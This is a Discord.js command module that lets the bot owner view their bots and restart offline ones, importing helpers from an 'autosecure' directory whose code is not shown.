const { EmbedBuilder } = require("discord.js");
const { initializationStatus } = require("../../../autosecure");
const createbotmsg = require("../../../autosecure/utils/bot/createbotmsg");
const { restartbots } = require("../../../autosecure/utils/bot/restartbots");
const { checkofflinebots } = require("../../../autosecure/utils/process/helpers");

module.exports = {
    name: "bots",
    botowneronly: true,
    description: "Manage your bots",
    callback: async (client, interaction) => {
        try {
            await interaction.deferReply({ ephemeral: true });

            let initialized = initializationStatus.get("botsInitialized");
            if (!initialized) {
                const startTime = Date.now();
                const timeout = 30000;
                const checkInterval = 500;

                while (!initialized && Date.now() - startTime < timeout) {
                    await new Promise(resolve => setTimeout(resolve, checkInterval));
                    initialized = initializationStatus.get("botsInitialized");
                }

                if (!initialized) {
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setDescription("Loading bots took way longer than expected, please report this.")
                                .setColor(0x40e0d0)
                        ],
                        ephemeral: true
                    });
                    return;
                }
            }

            const id = interaction.user.id;
            const offlineBots = await checkofflinebots(id);
          //  console.log(`Offline Bots: ${JSON.stringify(offlineBots)}`);

            if (offlineBots && offlineBots.length > 0) {
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle("Restarting Offline Bots...")
                            .setColor(0x40e0d0)
                    ]
                });

                const restartMessage = await restartbots(id, offlineBots);

                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle("Attempted to restart offline bots.")
                            .setDescription(restartMessage)
                            .setColor(0x40e0d0)
                    ]
                });

                const botMessage = await createbotmsg(client, id);
                await interaction.followUp({ ...botMessage, ephemeral: true });
                return;
            }

            const botMessage = await createbotmsg(client, id);
            await interaction.editReply(botMessage);

        } catch (err) {
            console.error("Error executing bots:", err);
            try {
                if (interaction.replied || interaction.deferred) {
                    await interaction.editReply({
                        content: "An error occurred while managing your bots.",
                        embeds: []
                    });
                } else {
                    await interaction.reply({
                        content: "An error occurred while managing your bots.",
                        ephemeral: true
                    });
                }
            } catch (sendErr) {
                console.error("Failed to send error message:", sendErr);
            }
        }
    }
};
